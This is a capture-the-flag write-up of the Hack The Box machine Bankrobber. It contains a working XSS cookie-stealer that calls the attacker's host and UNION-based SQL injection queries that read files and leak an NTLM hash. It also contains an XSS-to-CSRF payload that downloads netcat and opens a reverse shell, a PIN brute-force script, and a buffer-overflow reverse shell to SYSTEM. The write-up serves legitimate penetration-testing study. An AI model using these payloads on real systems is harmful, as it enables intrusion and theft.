---
title: "Hack The Box - Bankrobber"
date: 2022-03-23T10:00:30+1:00
categories:
  - HackTheBox
  - WriteUp
  - Windows
tags:
  - OSCP Preparation
  - XSS
  - SQL Injection
  - Buffer Overflow
  - Nmap
  - Gobuster
---

# Introduction

---

Bankrobber is an insane machine rated only 3.3. I think that there is some CTF stuff in there. But I will still try to solve the machine. Let’s start with the enumeration.

# Enumeration

---

I will start with an Nmap scan.

## Nmap Scan

---

Here are the results of a simple scan of all ports:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ sudo nmap -sS  -p- -v bankrobber.htb 
[sudo] password for user: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 16:06 CEST
Initiating Ping Scan at 16:06
Scanning bankrobber.htb (10.10.10.154) [4 ports]
Completed Ping Scan at 16:06, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:06
Scanning bankrobber.htb (10.10.10.154) [65535 ports]
Discovered open port 445/tcp on 10.10.10.154
Discovered open port 3306/tcp on 10.10.10.154
Discovered open port 443/tcp on 10.10.10.154
Discovered open port 80/tcp on 10.10.10.154
SYN Stealth Scan Timing: About 19.61% done; ETC: 16:09 (0:02:07 remaining)
SYN Stealth Scan Timing: About 47.93% done; ETC: 16:08 (0:01:06 remaining)
Completed SYN Stealth Scan at 16:08, 105.34s elapsed (65535 total ports)
Nmap scan report for bankrobber.htb (10.10.10.154)
Host is up (0.031s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 105.53 seconds
           Raw packets sent: 131151 (5.771MB) | Rcvd: 86 (3.768KB)
```

I will do a deep scan on the open ports found (with `-A` flag):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ sudo nmap -A  -p 80,443,445,3306 bankrobber.htb
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 16:09 CEST
Nmap scan report for bankrobber.htb (10.10.10.154)
Host is up (0.046s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), 
Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 8.1 Update 1 (86%), 
Microsoft Windows Phone 7.5 or 8.0 (86%), FreeBSD 6.2-RELEASE (86%), 
Microsoft Windows 10 1607 (85%), Microsoft Windows 10 1511 (85%), 
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8m05s, deviation: 0s, median: 8m05s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-07T14:17:47
|_  start_date: 2021-09-07T14:14:40

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   68.39 ms 10.10.16.1
2   68.57 ms bankrobber.htb (10.10.10.154)

Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds
```

## Service Enumeration

---

### Port 3306 (MySQL)

---

Without a password, I cannot log in to MySQL. I tried some default passwords, but none of them worked.

### Port 445 (SMB)

---

Here the same, I cannot connect to SMB:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ smbmap -H bankrobber.htb                                   
[!] Authentication error on bankrobber.htb
                                                 
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ smbclient -L //bankrobber.htb/
Enter WORKGROUP\user's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
```

### Port 80/443

---

It seems that on both Ports runs the same website. First, I did a Gobuster scan of the webserver:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ gobuster dir -u http://bankrobber.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,log,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bankrobber.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html,log
[+] Timeout:                 10s
===============================================================
2021/09/07 16:12:01 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 8245]                                              
/login.php            (Status: 302) [Size: 0] [--> index.php]                                 
/register.php         (Status: 200) [Size: 0]                                                 
/user                 (Status: 301) [Size: 341] [--> https://bankrobber.htb/user/] 
/admin                (Status: 301) [Size: 342] [--> https://bankrobber.htb/admin/]
/Login.php            (Status: 302) [Size: 0] [--> index.php]                            
/examples             (Status: 503) [Size: 1054]
/notes.txt            (Status: 200) [Size: 133]                                  
/generic.html         (Status: 200) [Size: 13343]                                         
/logout.php           (Status: 302) [Size: 0] [--> index.php?msg=Succesfully logged out]  
/elements.html        (Status: 200) [Size: 34812]
/User                 (Status: 301) [Size: 341] [--> https://bankrobber.htb/User/]    
/Link.php             (Status: 200) [Size: 0]                                         
/Admin                (Status: 301) [Size: 342] [--> https://bankrobber.htb/Admin/]
/Elements.html        (Status: 200) [Size: 34812]
/phpmyadmin           (Status: 403) [Size: 1205]
```

The vhost scan found nothing. So I visited the webpage. I created an account, tried to transfer some bitcoins. That worked, but an admin has to review the transaction. I noticed that there are 3 cookies:

![Untitled](/assets/images/2022-03-23-bankrobber/Untitled.png)

A cookie for id, username and password. The username and password are base64 encoded:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ echo dGVzdA== | base64 -d
test
```

Form the gobuster scan, I have two interesting directories, user and admin. The user directory is where I can send bitcoins (or E-Coins).

# Exploitation

---

The form might be vulnerable to XSS. An admin must review all transactions, so if I would be able to get the cookies of the admin, I could login as admin. So I write a little script, which I submit in the form which will make a request to my local webserver with the cookies:

```jsx
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.16.7/?test='+document.cookie, true);
request.send()
```

I use this comment (in the transfer e-coin form) to call the script:

```jsx
<script src="http://10.10.16.7/cookie.js"></script>
```

When looking at the webserver, I see this request:

```
10.10.10.154 - - [07/Sep/2021 19:18:54] "GET /cookie.js HTTP/1.1" 200 -
10.10.10.154 - - [07/Sep/2021 19:18:54] "GET /?test=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
```

Let me decode those credentials:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ echo YWRtaW4= | base64 -d
admin                                              
                                              
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ echo SG9wZWxlc3Nyb21hbnRpYw== | base64 -d      
Hopelessromantic
```

I set those cookies to the values found above and opened the admin page. It worked. In the navbar, there is a file linked called notes.txt:

```bash
- Move all files from the default Xampp folder: TODO
- Encode comments for every IP address except localhost: Done
- Take a break..
```

This basically tells my that the files (or most of them) are stored in the default XAMPP directory, which is c:/xampp/htdocs. At the bottom, there is a function called backdoor checker:

![Untitled](/assets/images/2022-03-23-bankrobber/Untitled1.png)

I can maybe use this to run code on the system. But I cannot access this functionality from my host. So let's check the other things on the webpage. There is a Search function for users, which is in the beta, so it might have some vulnerabilities. I check for SQL injections:

![Untitled](/assets/images/2022-03-23-bankrobber/Untitled2.png)

This means that I should be able to perform an SQL injection. I can try to list all users:

![Untitled](/assets/images/2022-03-23-bankrobber/Untitled3.png)

I used this cheatsheet for the next few commands:

[MySQL SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

Now I’ll try for a `UNION` injection. I’ll need to know how many columns. `SELECT 1` and `SELECT 1,2` returns errors, but `1,2,3` works:

![https://0xdf.gitlab.io/img/1569305297185.png](https://0xdf.gitlab.io/img/1569305297185.png)

There are three columns, and the value in 1 and 2 are returned to me. I can get the version and current user:

![https://0xdf.gitlab.io/img/1569305498542.png](https://0xdf.gitlab.io/img/1569305498542.png)

On enumerating the database using various commands ([this page](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) is a good reference), I didn’t find much of interest in the database. I did pull the hashes for authentication to MySQL with `10' UNION SELECT user,password,3 from mysql.user;-- -`:

![https://0xdf.gitlab.io/img/1569305663110.png](https://0xdf.gitlab.io/img/1569305663110.png)

But hashcat could not crack them. Using responder, I was also able to get the NTLM hash for a user:

`term=10' UNION SELECT 1,load_file('\\\\10.10.16.7\\test'),3-- -`

```bash
[SMB] NTLMv2-SSP Client   : 10.10.10.154
[SMB] NTLMv2-SSP Username : BANKROBBER\Cortin
[SMB] NTLMv2-SSP Hash     : Cortin::BANKROBBER:dcb76f42405253a1:A58980F36C02070C9F88E73344EF6AE4:0101000000000000005117B825A4D701EDCD5F848D0A544F0000000002000800520035004D004B0001001E00570049004E002D00410044005600320038003600550050004F004E00440004003400570049004E002D00410044005600320038003600550050004F004E0044002E00520035004D004B002E004C004F00430041004C0003001400520035004D004B002E004C004F00430041004C0005001400520035004D004B002E004C004F00430041004C0007000800005117B825A4D70106000400020000000800300030000000000000000000000000200000F9FB650C7A3C4E4BBCF36EEC538389716341DA50E9CA2718666FDF6CE48FD7A30A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003700000000000000000000000000
```

Hashcat could not crack this hash, with the username, I would be able to read the user flag, but where's the sense behind this. The goal is to get a shell. I remebered the backdoorchecker functionality which only works from localhost. Since I know that XAMPP is installed in the default directory, I can view the source code of the file:

`10' UNION SELECT 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3;-- -`

It did not work when I call it in the browser, but in burp this works just fine:

```php
<?php
include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad 	  = array('$(','&');
$good 	  = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
	$good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
	if(isset($_POST['cmd'])){
			// FILTER ESCAPE CHARS
			foreach($bad as $char){
				if(strpos($_POST['cmd'],$char) !== false){
					die("You're not allowed to do that.");
				}
			}
			// CHECK IF THE FIRST 2 CHARS ARE LS
			if(substr($_POST['cmd'], 0,strlen($good)) != $good){
				die("It's only allowed to use the $good command");
			}

			if($_SERVER['REMOTE_ADDR'] == "::1"){
				system($_POST['cmd']);
			} else{
				echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
			}
	}
} else{
	echo "You are not allowed to use this function!";
}
?>
```

There are some filters, but they only check for `$(` and `&`, so I can bypass them with `;` or `|`. The real difficult part is to send the request from localhost. I can use the XSS vulnerability to create a XSRF attack. So that the admin user calls the php file for me. I use this script to do this:

```jsx
var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.16.7/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.16.7 4444';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);
```

So I logged out, started two webservers (one for the script and one for nc64.exe) and used this javascript fragment to execute the script:

```jsx
<script src="http://10.10.16.7:90/shell.js"></script>
```

Start a netcat listener, and wait (it took about two minutes):

```bash
10.10.10.154 - - [07/Sep/2021 20:38:01] "GET /shell.js HTTP/1.1" 200 -
10.10.10.154 - - [07/Sep/2021 20:38:02] "GET /nc64.exe HTTP/1.1" 200 -
```

A shell spawns in the netcat listener:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ rlwrap nc -lvnp 4444        
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.154] 49716
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\xampp\htdocs\admin>whoami
bankrobber\cortin
```

I will now be able to get the user flag.

## User Flag

---

That took long, but here it is:

```bash
dir
 Volume in drive C has no label.
 Volume Serial Number is BC8D-2AD7

 Directory of C:\Users\Cortin\Desktop

25-04-2019  19:16    <DIR>          .
25-04-2019  19:16    <DIR>          ..
25-04-2019  00:40                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   8.519.823.360 bytes free

type user.txt
type user.txt
f6**************************69ac
```

# Privesc

---

There is a binary called bankv2.exe at the root of the disk, but I can't access it. So I checked netstat:

```bash
C:\>netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1108
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       732
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       1108
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1488
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1868
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       456
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1364
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       576
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       588
  TCP    10.10.10.154:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:80                [::]:0                 LISTENING       1108
  TCP    [::]:135               [::]:0                 LISTENING       732
  TCP    [::]:443               [::]:0                 LISTENING       1108
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3306              [::]:0                 LISTENING       1868
  TCP    [::]:49664             [::]:0                 LISTENING       456
  TCP    [::]:49665             [::]:0                 LISTENING       888
  TCP    [::]:49666             [::]:0                 LISTENING       840
  TCP    [::]:49667             [::]:0                 LISTENING       1364
  TCP    [::]:49668             [::]:0                 LISTENING       576
  TCP    [::]:49669             [::]:0                 LISTENING       588
```

Port 910 is interesting, because I was not able to see that on my nmap scan. I enumerate this port further:

```bash
C:\>tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
...[snip]...
bankv2.exe                    1488                            0        136 K
...[snip]...
```

It is running bankv2.exe, to which I had no access. So I try to connect to it using netcat:

```bash
%temp%\n.exe localhost 910

 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
1234
 [!] Access denied, disconnecting client....
```

The pin  was just a random guess. I can bruteforce this, but I do not want to do this in the shell. So I tunnel the port using a meterpreter shell, which I just created:

```python
meterpreter > portfwd add -l 910 -p 910 -r 127.0.0.1
[*] Local TCP relay created: :910 <-> 127.0.0.1:910
```

Back on my attacking machine, I created a python script to bruteforce the pin:

```python
from pwn import *
import time
import sys

i = int(sys.argv[1])
j = int(sys.argv[2])
while True:
    m = ""
    if i < j:
        pin = str(i).zfill(4)
        p = remote("127.0.0.1", 910)
        try:
            p.recvuntil("[$]", timeout=30)
            p.sendline("%s" % pin)
        except EOFError:
            print("Retry on %d" % i)
            continue
        try:
            m = p.recvline(timeout=10)
            print(m)
        except EOFError:
            print("Retry on %d" % i)
            continue
        if "Access denied, disconnecting client" not in str(m):
            print(m)
            exit(0)
        print("Doing ... " + str(i))
        i = i + 1
    else:
        print("We're done.")
        exit(0)
    p.close()
```

I run it:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ python3 brute.py 0 100
[+] Opening connection to 127.0.0.1 on port 910: Done
---snip---
Retry on 21
[+] Opening connection to 127.0.0.1 on port 910: Done
b'  [$] PIN is correct, access granted!\n'
b'  [$] PIN is correct, access granted!\n'
[*] Closed connection to 127.0.0.1 port 910
```

So I try to connect:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] asdfasdfasfasdf
 [$] Transfering $asdfasdfasfasdf using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...
```

## Overflow

---

So I can enter anything. Let's try to search for a buffer overflow:

```bash
--------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

It seems that the application is overflown, I restarted the box and got my shell again, which took some time. So this is a simple buffer overflow to call a root shell, but I have to use smaller payloads, so that the application does not crash. I do not have to create a real payload, I can just start a netcat reverse shell. I created an msf-pattern with the lenght of 40:

```bash
Please enter the amount of e-coins you would like to transfer:
 [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
 [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: 0Ab1Ab2A

 [$] Transaction in progress, you can safely disconnect...
```

Lucky for me the application did not crash. This gives an offset of `32`. So I can create the payload:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$  python -c 'print "A"*32 + "\\Users\\Cortin\\AppData\\Local\\Temp\\n.exe -e cmd.exe 10.10.16.7 5555"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.16.7 5555
```

Now, insert this payload into the application:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.16.7 5555
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.16.7 5555 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: \Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.16.7 5555

 [$] Transaction in progress, you can safely disconnect...
```

And you will get a reverse shell:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/bankrobber]
└─$ rlwrap nc -lvnp 5555             
listening on [any] 5555 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.154] 49742
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

whoami
whoami
nt authority\system
```

## Root Flag

---

With the shell as nt authority\system, I can read the root flag:

```bash
cd Desktop

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BC8D-2AD7

 Directory of C:\Users\admin\Desktop

01/11/2021  03:31 PM    <DIR>          .
01/11/2021  03:31 PM    <DIR>          ..
04/25/2019  12:39 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   8,519,327,744 bytes free

type root.txt
type root.txt
aa**************************b197
```

# Conclusion

---

This box was really hard for me. It is a good preparation because you need to know many things, and you need to combine them. The box was not insane but it was hard enough.